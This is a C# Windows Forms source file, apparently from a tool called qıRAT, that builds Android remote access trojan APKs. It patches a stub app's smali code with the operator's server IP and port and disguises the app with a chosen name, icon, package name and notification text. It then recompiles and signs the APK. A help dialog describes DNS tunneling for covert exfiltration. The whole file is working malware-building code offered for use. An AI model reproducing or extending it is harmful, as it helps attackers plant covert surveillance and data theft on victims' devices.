using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;

namespace qıRAT
{
    public partial class builderform : Form
    {
        private string selectedIconPath = "";
        
        public builderform()
        {
            InitializeComponent();
            this.MaximizeBox = false;
            richTextBox1.ReadOnly = true;
            textBoxpackagename.ReadOnly = true;  


            pictureBoxapkicon.Click += PictureBoxapkicon_Click;
            button1build.Click += Button1build_Click;
        }

        private void PictureBoxapkicon_Click(object sender, EventArgs e)
        {
            try
            {
                string appLogoPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "res", "applogo");
                

                if (!Directory.Exists(appLogoPath))
                {
                    Directory.CreateDirectory(appLogoPath);
                }


                using (OpenFileDialog ofd = new OpenFileDialog())
                {
                    ofd.InitialDirectory = appLogoPath;
                    ofd.Filter = "PNG Files (*.png)|*.png|All Files (*.*)|*.*";
                    ofd.Title = "Select APK Icon (PNG)";
                    
                    if (ofd.ShowDialog() == DialogResult.OK)
                    {
                        selectedIconPath = ofd.FileName;
                        

                        using (var bmpTemp = new Bitmap(selectedIconPath))
                        {
                            pictureBoxapkicon.Image = new Bitmap(bmpTemp);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Icon selection error: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private async void Button1build_Click(object sender, EventArgs e)
        {

            tabControl1.SelectedTab = tabPage2;
            richTextBox1.Clear();
            AppendLog("=== qıRAT APK Builder Started ===");
            

            if (string.IsNullOrWhiteSpace(textBox2appname.Text) ||
                string.IsNullOrWhiteSpace(textBox5ipadressapk.Text) ||
                string.IsNullOrWhiteSpace(textBox6portadressapk.Text))
            {
                AppendLog("[ERROR] App name, IP, and Port are required!");
                MessageBox.Show("Please fill in required fields: App Name, IP, Port", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }


            button1build.Enabled = false;
            
            try
            {
                await Task.Run(() => BuildAPK());
            }
            catch (Exception ex)
            {
                AppendLog($"[CRITICAL ERROR] {ex.Message}");
            }
            finally
            {
                button1build.Enabled = true;
            }
        }

        private void BuildAPK()
        {
            try
            {

                string baseDir = AppDomain.CurrentDomain.BaseDirectory;
                string stubFolderPath = Path.Combine(baseDir, "res", "stub", "stubapk");
                string toolsDir = Path.Combine(baseDir, "res", "tools");
                string outDir = Path.Combine(baseDir, "res", "out");
                string tempDir = Path.Combine(baseDir, "res", "temp");
                
                AppendLog($"Base Directory: {baseDir}");
                AppendLog($"Stub Folder: {stubFolderPath}");
                

                if (!Directory.Exists(stubFolderPath))
                {
                    AppendLog("[ERROR] Stub folder not found! Expected: " + stubFolderPath);
                    return;
                }
                

                if (Directory.Exists(tempDir))
                {
                    Directory.Delete(tempDir, true);
                }
                Directory.CreateDirectory(tempDir);
                

                if (!Directory.Exists(outDir))
                {
                    Directory.CreateDirectory(outDir);
                }
                else
                {

                    try
                    {
                        string[] oldApks = Directory.GetFiles(outDir, "*.apk");
                        if (oldApks.Length > 0)
                        {
                            AppendLog($"Cleaning {oldApks.Length} old APK(s) from output folder...");
                            foreach (string apk in oldApks)
                            {
                                File.Delete(apk);
                            }
                            AppendLog("[OK] Old APKs deleted");
                        }
                    }
                    catch (Exception cleanEx)
                    {
                        AppendLog($"[WARN] Could not clean old APKs: {cleanEx.Message}");
                    }
                }
                
                string workingDir = Path.Combine(tempDir, "stubapk");
                

                AppendLog("\nCopying stub folder to temp...");
                CopyDirectory(stubFolderPath, workingDir);
                AppendLog("[OK] Stub folder copied");
                

                AppendLog("\nModifying APK files...");
                ModifyAPKFiles(workingDir);
                

                if (!string.IsNullOrEmpty(selectedIconPath) && File.Exists(selectedIconPath))
                {
                    AppendLog("\nReplacing icon...");
                    ReplaceIcon(workingDir, selectedIconPath);
                }
                

                AppendLog("\nRecompiling APK...");
                string unsignedApk = Path.Combine(tempDir, "unsigned.apk");
                string apktoolPath = Path.Combine(toolsDir, "apktool.jar");
                if (!RunCommand("java", $"-jar \"{apktoolPath}\" b \"{workingDir}\" -o \"{unsignedApk}\"", toolsDir))
                {
                    AppendLog("[ERROR] Recompile failed!");
                    return;
                }
                AppendLog("[OK] Recompile successful");
                

                AppendLog("\nSigning APK...");
                string finalApkName = string.IsNullOrWhiteSpace(textBox2appname.Text) ? "output" : textBox2appname.Text;
                string signedApk = Path.Combine(outDir, $"{finalApkName}.apk");
                if (!SignAPK(unsignedApk, signedApk, toolsDir))
                {
                    AppendLog("[ERROR] Signing failed!");
                    return;
                }
                AppendLog("[OK] APK signed successfully");
                

                AppendLog("\nCleaning temporary files...");
                try
                {
                    if (Directory.Exists(tempDir))
                    {
                        Directory.Delete(tempDir, true);
                        AppendLog("[OK] Temp folder deleted");
                    }
                }
                catch (Exception cleanEx)
                {
                    AppendLog($"[WARN] Could not delete temp folder: {cleanEx.Message}");
                }
                

                AppendLog("\n=== BUILD COMPLETED SUCCESSFULLY ===");
                AppendLog($"Output: {signedApk}");
                

                Process.Start("explorer.exe", outDir);
                
            }
            catch (Exception ex)
            {
                AppendLog($"[BUILD ERROR] {ex.Message}");
                AppendLog($"Stack: {ex.StackTrace}");
            }
        }

        private void CopyDirectory(string sourceDir, string destDir)
        {
            Directory.CreateDirectory(destDir);
            
            foreach (string file in Directory.GetFiles(sourceDir))
            {
                string destFile = Path.Combine(destDir, Path.GetFileName(file));
                File.Copy(file, destFile, true);
            }
            
            foreach (string dir in Directory.GetDirectories(sourceDir))
            {
                string destSubDir = Path.Combine(destDir, Path.GetFileName(dir));
                CopyDirectory(dir, destSubDir);
            }
        }

        private void ModifyAPKFiles(string decodedDir)
        {
            try
            {

                string manifestPath = Path.Combine(decodedDir, "AndroidManifest.xml");
                if (File.Exists(manifestPath))
                {
                    string manifest = File.ReadAllText(manifestPath);
                    

                    if (!string.IsNullOrWhiteSpace(textBoxpackagename.Text))
                    {

                        manifest = System.Text.RegularExpressions.Regex.Replace(
                            manifest,
                            @"package=""[^""]+""",
                            $"package=\"{textBoxpackagename.Text}\""
                        );
                    }
                    

                    manifest = System.Text.RegularExpressions.Regex.Replace(
                        manifest,
                        @"android:versionName=""[^""]+""",
                        $"android:versionName=\"{textBox4appversion.Text}\""
                    );
                    
                    File.WriteAllText(manifestPath, manifest);
                    AppendLog("  - AndroidManifest.xml updated");
                }
                

                string stringsPath = Path.Combine(decodedDir, "res", "values", "strings.xml");
                if (File.Exists(stringsPath))
                {
                    string strings = File.ReadAllText(stringsPath);
                    

                    strings = System.Text.RegularExpressions.Regex.Replace(
                        strings,
                        @"<string name=""app_name"">[^<]*</string>",
                        $"<string name=\"app_name\">{textBox2appname.Text}</string>"
                    );
                    

                    if (!strings.Contains("service_notification"))
                    {
                        strings = strings.Replace("</resources>", 
                            $"    <string name=\"service_notification\">{textBox1systemnotification.Text}</string>\n</resources>");
                    }
                    else
                    {
                        strings = System.Text.RegularExpressions.Regex.Replace(
                            strings,
                            @"<string name=""service_notification"">[^<]*</string>",
                            $"<string name=\"service_notification\">{textBox1systemnotification.Text}</string>"
                        );
                    }
                    
                    File.WriteAllText(stringsPath, strings);
                    AppendLog("  - strings.xml updated");
                }
                


                string[] possibleSmaliDirs = new string[]
                {
                    "smali",
                    "smali_classes2",
                    "smali_classes3",
                    "smali_classes4",
                    "smali_classes5"
                };
                
                bool socketFound = false;
                foreach (string smaliDir in possibleSmaliDirs)
                {
                    string socketJavaPath = Path.Combine(decodedDir, smaliDir, "com", "qirat", "stub", "Socket.smali");
                    if (File.Exists(socketJavaPath))
                    {
                        string socketCode = File.ReadAllText(socketJavaPath);
                        

                        socketCode = System.Text.RegularExpressions.Regex.Replace(
                            socketCode,
                            @"const-string v\d+, ""[\d.]+""[\s\S]*?sput-object v\d+, Lcom/qirat/stub/Socket;->SERVER_IP:Ljava/lang/String;",
                            $"const-string v0, \"{textBox5ipadressapk.Text}\"\n\n    sput-object v0, Lcom/qirat/stub/Socket;->SERVER_IP:Ljava/lang/String;"
                        );
                        
                        socketCode = System.Text.RegularExpressions.Regex.Replace(
                            socketCode,
                            @"const/16 v\d+, 0x[0-9a-fA-F]+[\s\S]*?sput v\d+, Lcom/qirat/stub/Socket;->SERVER_PORT:I",
                            $"const/16 v0, 0x{int.Parse(textBox6portadressapk.Text):X}\n\n    sput v0, Lcom/qirat/stub/Socket;->SERVER_PORT:I"
                        );
                        
                        File.WriteAllText(socketJavaPath, socketCode);
                        AppendLog($"  - Socket.smali updated in {smaliDir} (IP: {textBox5ipadressapk.Text}, Port: {textBox6portadressapk.Text})");
                        socketFound = true;

                    }
                }
                
                if (!socketFound)
                {
                    AppendLog("  [WARN] Socket.smali not found in any smali folder!");
                }        
            }
            catch (Exception ex)
            {
                AppendLog($"  [MOD ERROR] {ex.Message}");
            }
        }

        private void ReplaceIcon(string decodedDir, string iconPath)
        {
            try
            {

                string[] iconDirs = new string[]
                {
                    Path.Combine(decodedDir, "res", "mipmap-mdpi"),
                    Path.Combine(decodedDir, "res", "mipmap-hdpi"),
                    Path.Combine(decodedDir, "res", "mipmap-xhdpi"),
                    Path.Combine(decodedDir, "res", "mipmap-xxhdpi"),
                    Path.Combine(decodedDir, "res", "mipmap-xxxhdpi")
                };

                int iconCount = 0;
                foreach (var dir in iconDirs)
                {
                    if (Directory.Exists(dir))
                    {

                        string targetIconPng = Path.Combine(dir, "ic_launcher.png");
                        string targetIconWebp = Path.Combine(dir, "ic_launcher.webp");
                        string targetRoundPng = Path.Combine(dir, "ic_launcher_round.png");
                        string targetRoundWebp = Path.Combine(dir, "ic_launcher_round.webp");
                        

                        if (File.Exists(targetIconWebp))
                        {

                            File.Delete(targetIconWebp);
                            File.Copy(iconPath, targetIconPng, true);
                            iconCount++;
                        }
                        else if (File.Exists(targetIconPng))
                        {
                            File.Copy(iconPath, targetIconPng, true);
                            iconCount++;
                        }
                        

                        if (File.Exists(targetRoundWebp))
                        {
                            File.Delete(targetRoundWebp);
                            File.Copy(iconPath, targetRoundPng, true);
                        }
                        else if (File.Exists(targetRoundPng))
                        {
                            File.Copy(iconPath, targetRoundPng, true);
                        }
                    }
                }
                
                if (iconCount > 0)
                {
                    AppendLog($"  - Icon replaced in {iconCount} densities");
                }
                else
                {
                    AppendLog("  [WARN] No icon files found to replace");
                }
            }
            catch (Exception ex)
            {
                AppendLog($"  [ICON ERROR] {ex.Message}");
            }
        }

        private bool SignAPK(string unsignedApk, string signedApk, string toolsDir)
        {
            try
            {

                string zipalignPath = Path.Combine(toolsDir, "zipalign.exe");
                string apksignerPath = Path.Combine(toolsDir, "apksigner.jar");
                string keystorePath = Path.Combine(toolsDir, "keystore.jks");
                string pemPath = Path.Combine(toolsDir, "apktool.pem");
                string pk8Path = Path.Combine(toolsDir, "apktool.pk8");
                
                string alignedApk = unsignedApk.Replace(".apk", "_aligned.apk");
                

                if (File.Exists(zipalignPath))
                {
                    if (!RunCommand(zipalignPath, $"-f -v 4 \"{unsignedApk}\" \"{alignedApk}\"", toolsDir))
                    {
                        AppendLog("  [WARN] Zipalign failed, continuing...");
                        alignedApk = unsignedApk; // Fallback
                    }
                }
                else
                {
                    alignedApk = unsignedApk;
                }
                

                if (File.Exists(apksignerPath))
                {
                    bool signed = false;
                    

                    if (File.Exists(keystorePath))
                    {
                        AppendLog("  Using keystore.jks for signing...");
                        signed = RunCommand("java", 
                            $"-jar \"{apksignerPath}\" sign --ks \"{keystorePath}\" --ks-pass pass:android --out \"{signedApk}\" \"{alignedApk}\"",
                            toolsDir);
                    }

                    else if (File.Exists(pemPath) && File.Exists(pk8Path))
                    {
                        AppendLog("  Using PEM/PK8 certificates for signing...");
                        signed = RunCommand("java", 
                            $"-jar \"{apksignerPath}\" sign --key \"{pk8Path}\" --cert \"{pemPath}\" --out \"{signedApk}\" \"{alignedApk}\"",
                            toolsDir);
                    }
                    
                    if (signed)
                    {
                        return true;
                    }
                }
                

                File.Copy(alignedApk, signedApk, true);
                AppendLog("  [WARN] Signing tools not found or failed, APK is unsigned");
                return true;
            }
            catch (Exception ex)
            {
                AppendLog($"  [SIGN ERROR] {ex.Message}");
                return false;
            }
        }

        private bool RunCommand(string fileName, string arguments, string workingDir)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = fileName,
                    Arguments = arguments,
                    WorkingDirectory = workingDir,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true
                };

                using (Process process = Process.Start(psi))
                {

                    process.OutputDataReceived += (s, e) => 
                    {
                        if (!string.IsNullOrEmpty(e.Data))
                            AppendLog("  " + e.Data);
                    };
                    process.ErrorDataReceived += (s, e) => 
                    {
                        if (!string.IsNullOrEmpty(e.Data))
                            AppendLog("  [ERR] " + e.Data);
                    };

                    process.BeginOutputReadLine();
                    process.BeginErrorReadLine();
                    process.WaitForExit();

                    return process.ExitCode == 0;
                }
            }
            catch (Exception ex)
            {
                AppendLog($"[CMD ERROR] {ex.Message}");
                return false;
            }
        }

        private void AppendLog(string message)
        {
            if (richTextBox1.InvokeRequired)
            {
                richTextBox1.Invoke(new Action(() => AppendLog(message)));
                return;
            }

            richTextBox1.AppendText(message + "\n");
            richTextBox1.ScrollToCaret();
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {
            MessageBox.Show("DNS tunneling is the transmission of confidential data using DNS traffic. Data is hidden within DNS queries and responses, allowing security measures to be bypassed. It is commonly used by malware for data exfiltration and covert communication. If you are going to conduct tests in a local environment, you must enter your local IP address and the IP address you entered on the qiRAT login screen in this section (the localhost IP address is only used during DNS tunneling).\r\n\r\n", "DNS Tunelling", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void tabControl1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }
    }
}
